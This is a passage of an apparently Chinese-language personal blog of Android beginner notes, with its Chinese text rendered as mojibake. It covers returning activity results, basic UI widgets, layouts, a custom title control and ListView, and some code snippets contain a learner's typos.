class="comment">//æ¥å—æ¥è‡ªé”€æ¯æ´»åŠ¨çš„ç»“æœ</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">                String returnData = data.getStringExtra(<span class="string">&quot;data_return&quot;</span>);<span class="comment">//æ¥å—æ¥è‡ªé”€æ¯æ´»åŠ¨è¿”å›çš„å­—ç¬¦ä¸²ï¼Œæ”¾åœ¨returnDataä¸­</span></span><br><span class="line">                Log.d(<span class="string">&quot;firstActivity&quot;</span>, returnData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//secondActivity.java</span></span><br><span class="line"> setContentView(R.layout.activity_second);</span><br><span class="line">        Button button2 = (Button) findViewById(R.id.button2);</span><br><span class="line">        button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                        <span class="comment">//æ„é€ ä¸€ä¸ªæ–°çš„intentç”¨äºå›ä¼ ï¼Œå¹¶ä¸”å°†ç»“æœçš„å€¼ç½®ä¸ºRESULT_OK</span></span><br><span class="line">                        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                        intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;hello firstactivity&quot;</span>);</span><br><span class="line">                        setResult(RESULT_OK,intent) ;</span><br><span class="line">                        finish();<span class="comment">//é”€æ¯</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹backé”®çš„æƒ…å†µè¿›è¡Œå¤„ç†ï¼Œé€»è¾‘åŒOnClick</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// ä¸å¯ä»¥æœ‰é»˜è®¤åˆ›å»ºçš„è¿™ä¸ªç»§æ‰¿ï¼Œä¼šå¯¼è‡´æ— æ•ˆ       super.onBackPressed();</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;hello firstacticity&quot;</span>);</span><br><span class="line">        setResult(RESULT_OK,intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h2><h3 id="æ§ä»¶"><a href="#æ§ä»¶" class="headerlink" title="æ§ä»¶"></a>æ§ä»¶</h3><p>åœ¨LinearLayoutå¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œåªæœ‰android:orientation=â€verticalâ€æ‰å¯ä»¥ä¸é‡å çš„æ˜¾ç¤º</p>
<ul>
<li><p>TextView</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;24sp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">&quot;#00ff00&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;this is Text view&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>Button</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:textAllCaps</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
<li><p>EditText</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:maxLines</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>hintæŒ‡çš„æ˜¯æœªè¾“å…¥æ–‡å­—ä¹‹å‰çš„æç¤º</p>
<p>maxlineè¡¨ç¤ºçš„æ˜¯æœ€å¤§æ˜¾ç¤ºçš„è¡Œæ•°</p>
</li>
<li><p>ImageView</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:id</span>=<span class="string">&quot;@+id/image_view&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:src</span>=<span class="string">&quot;@drawable/img_1&quot;</span></span></span><br><span class="line"><span class="tag">           /&gt;</span></span><br></pre></td></tr></table></figure>

<p>srcä¸ºèµ„æºç›®å½•ä¸‹çš„å›¾ç‰‡</p>
</li>
<li><p>ProgressBar</p>
<p>è½¬åœˆåœˆè¿›åº¦æ¡</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:id</span>=<span class="string">&quot;@+id/progress_bar&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªçŠ¶æ€æ </span></span><br><span class="line">ProgressBar progress_bar = (ProgressBar)findViewById(R.id.progress_bar);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//visibleå¯è§  goneæ¶ˆå¤±   invisibleä¸å¯è§</span></span><br><span class="line"><span class="comment">//get visibility</span></span><br><span class="line">progress_bar.getVisibility() == View.VISIBLE</span><br><span class="line"><span class="comment">//set gone</span></span><br><span class="line">    progress_bar.setVisibility(View.GONE);</span><br><span class="line"><span class="comment">//set visible</span></span><br><span class="line">    progress_bar.setVisibility(View.VISIBLE);</span><br></pre></td></tr></table></figure>

<p>æ°´å¹³è¿›åº¦æ¡</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:id</span>=<span class="string">&quot;@+id/progress_bar&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:max</span>=<span class="string">&quot;100&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®è¿›åº¦æ¡çš„å€¼</span></span><br><span class="line"><span class="keyword">int</span> progerss = progressBar.getProgress();</span><br><span class="line">progeress = Progress +<span class="number">10</span> ;</span><br><span class="line">progressBar.setProgress(progress);</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>AlertDialog</p>
<p>ç‚¹å‡»æŒ‰é’®å¼¹å‡ºå¯¹è¯æ¡†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">           AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">           dialog.setTitle(<span class="string">&quot;this is dialog&quot;</span>);</span><br><span class="line">           dialog.setMessage(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">           dialog.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">           dialog.setPositiveButton(<span class="string">&quot;ok&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">           dialog.setNegativeButton(<span class="string">&quot;cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">           dialog.show();</span><br><span class="line">  </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li>
<li><p>ProgressDialog</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProgressDialog progressDialog = <span class="keyword">new</span> ProgressDialog(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">                progressDialog.setTitle(<span class="string">&quot;this is progressdialog&quot;</span>);</span><br><span class="line">                progressDialog.setMessage(<span class="string">&quot;loading..&quot;</span>);</span><br><span class="line">                progressDialog.setCancelable(<span class="keyword">true</span>);</span><br><span class="line">                progressDialog.show();</span><br><span class="line"><span class="comment">//å¤§è‡´å’Œå¯¹è¯æ¡†ç›¸åŒ</span></span><br><span class="line"><span class="comment">//å½“Setcancelableä¸ºå‡æ—¶ï¼Œä¸èƒ½é€šè¿‡backå–æ¶ˆï¼Œåœ¨è°ƒç”¨å®Œä¹‹åä½¿ç”¨dismiss()æ¥å…³é—­å¯¹è¯æ¡†</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="å››ç§å¸ƒå±€"><a href="#å››ç§å¸ƒå±€" class="headerlink" title="å››ç§å¸ƒå±€"></a>å››ç§å¸ƒå±€</h3><h4 id="LinearLayout"><a href="#LinearLayout" class="headerlink" title="LinearLayout"></a>LinearLayout</h4><p>edittextè‡ªé€‚åº”,buttonä»…åŒ…è£¹æ–‡å­—</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;warp_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>edittext:button = 3:2æ¯”ä¾‹å¸ƒå±€</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="RelativeLayout"><a href="#RelativeLayout" class="headerlink" title="RelativeLayout"></a>RelativeLayout</h4><ul>
<li><p>ç›¸å¯¹çˆ¶å…ƒç´ å¸ƒå±€</p>
<p>android:layout_alignParentButtom</p>
<p>android:layout_alignParentTop</p>
<p>android:layout_alignParentLeft</p>
<p>android:layout_alignParentRight</p>
<p>android:layout_centerInParent</p>
<p>å–å€¼å‡ä¸ºå¸ƒè€³å€¼</p>
</li>
<li><p>ç›¸å¯¹æ§ä»¶å¸ƒå±€</p>
<p>android:layout_above=â€@id/idå€¼â€</p>
<p>android:layout_below=â€@id/idå€¼â€</p>
<p>android:layout_toRightOf=â€@id/idå€¼â€</p>
<p>android:layout_toLeftOf=â€@id/idå€¼â€</p>
<p>ps:å½“ä¸€ä¸ªæ§ä»¶å¼•ç”¨å¦ä¸€ä¸ªæ§ä»¶ï½‰ï½„æ—¶å¿…é¡»è¦å®šä¹‰åœ¨å¼•ç”¨æ§ä»¶çš„åé¢ã€‚</p>
</li>
</ul>
<h4 id="FrameLayout"><a href="#FrameLayout" class="headerlink" title="FrameLayout"></a>FrameLayout</h4><h4 id="PercentFrameLayout"><a href="#PercentFrameLayout" class="headerlink" title="PercentFrameLayout"></a>PercentFrameLayout</h4><p>åœ¨app/build.gradleæ–‡ä»¶çš„dependencies</p>
<p>æ·»åŠ ã€€<code>compile &#39;com.android.support:percent:24.2.1&#39;</code></p>
<p>sync now</p>
<p>ä¾‹å­ï¼šä¸€å±å æ»¡å››ä¸ªæŒ‰é’®</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left | top&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button1&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;right | top&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button2&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button3&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left | bottom&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button3&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button4&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_gravity</span>=<span class="string">&quot;right | buttom&quot;</span></span></span><br><span class="line"><span class="tag">     	<span class="attr">app:layout_wedthPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">app:layout_heightPercent</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button4&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="è‡ªå®šä¹‰ç³»ç»Ÿæ§ä»¶"><a href="#è‡ªå®šä¹‰ç³»ç»Ÿæ§ä»¶" class="headerlink" title="è‡ªå®šä¹‰ç³»ç»Ÿæ§ä»¶"></a>è‡ªå®šä¹‰ç³»ç»Ÿæ§ä»¶</h3><ul>
<li>è‡ªå®šä¹‰å¸ƒå±€é¡¶æ ActionBar</li>
</ul>
<p>å°†å†™å¥½çš„æ ‡é¢˜æ xmlæ”¾å…¥layoutæ–‡ä»¶å¤¹ä¸­ï¼Œå‡è®¾ä¸ºtitle.xml</p>
<p>åœ¨activity_main.xmlå¸ƒå±€æ–‡ä»¶ä¸­æ·»åŠ </p>
<p><code>&lt;include layout = &quot;layout/title&quot;&gt;</code></p>
<p>æŠŠç³»ç»Ÿè‡ªå¸¦çš„æ ‡é¢˜æ éšè—</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// in func OnCreate()</span></span><br><span class="line">ActionBar Actionbar = getSupportAcitonBar();</span><br><span class="line"><span class="keyword">if</span>(actionbar != <span class="keyword">null</span>)</span><br><span class="line">    actionbar.hide();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>è‡ªå®šä¹‰æ§ä»¶</li>
</ul>
<p>åœ¨title.xmlå·²ç»å»ºç«‹å¥½çš„æƒ…å†µä¸‹ï¼Œæ–°å»ºä¸€ä¸ªTitleLayoutç»§æ‰¿è‡ªLinearLayout,è®©ä»–æˆä¸ºè‡ªå®šä¹‰çš„æ ‡ç­¾æ æ§ä»¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleLinearout</span> <span class="keyword">extends</span> <span class="title">LinearLayout</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TitileLayout</span><span class="params">(Context context , AttributeSet attrs)</span></span></span><br><span class="line"><span class="function">        <span class="title">super</span><span class="params">(context,attrs)</span></span>;</span><br><span class="line">    <span class="comment">//åŠ¨æ€åŠ è½½ä¸€ä¸ªå¸ƒå±€æ–‡ä»¶ï¼Œinflateæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œidå’ŒåŠ è½½å¥½çš„å¸ƒå±€æ·»åŠ ä¸€ä¸ªçˆ¶å¸ƒå±€</span></span><br><span class="line">    	LayoutInflater.from(context).inflate(R.layout.title,<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å¸ƒå±€æ–‡ä»¶ä¸­æ·»åŠ è‡ªå®šä¹‰æ§ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayuot</span>&gt;</span></span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout+_height=&quot;warp_content&quot;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨äº‹ä»¶è§¦å‘çš„æ—¶å€™ç›´æ¥è°ƒç”¨å°±è¡Œ</p>
<h3 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h3><p>activity_main.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>//MainAcitivity.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] data = &#123;</span><br><span class="line">            <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(</span><br><span class="line">                MainActivity.<span class="keyword">this</span>, android.R.layout.simple_list_item_1,data</span><br><span class="line">        );</span><br><span class="line">        ListView listview = (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listview.setAdapter(adapter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>//  listviewç‚¹å‡»äº‹ä»¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] data = &#123;</span><br><span class="line">           <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span>,</span><br><span class="line">           <span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;10&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">       ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(</span><br><span class="line">               MainActivity.<span class="keyword">this</span>, android.R.layout.simple_list_item_1,data</span><br><span class="line">       );</span><br><span class="line">       ListView listview = (ListView) findViewById(R.id.list_view);</span><br><span class="line">       listview.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line">       listview.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">               Toast.makeText(MainActivity.<span class="keyword">this</span>, position+<span class="string">&quot; is clicked &quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>è¿›é˜¶ï¼š<ol>
<li>ç»“åˆå›¾ç‰‡çš„listerview</li>
<li>æå‡æ•ˆç‡</li>
</ol>
</li>
</ul>
<h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h3><h2 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h2><h3 id="contextç±»ä½¿ç”¨javaæ–‡ä»¶æµè¯»å†™æ–‡ä»¶"><a href="#contextç±»ä½¿ç”¨javaæ–‡ä»¶æµè¯»å†™æ–‡ä»¶" class="headerlink" title="contextç±»ä½¿ç”¨javaæ–‡ä»¶æµè¯»å†™æ–‡ä»¶"></a>contextç±»ä½¿ç”¨javaæ–‡ä»¶æµè¯»å†™æ–‡ä»¶</h3><p>æ‡’çš„çœ‹ï¼Œç”¨åˆ°æ—¶å†å†™ï¼Œä¸å¦‚ç”¨sharePreferences</p>
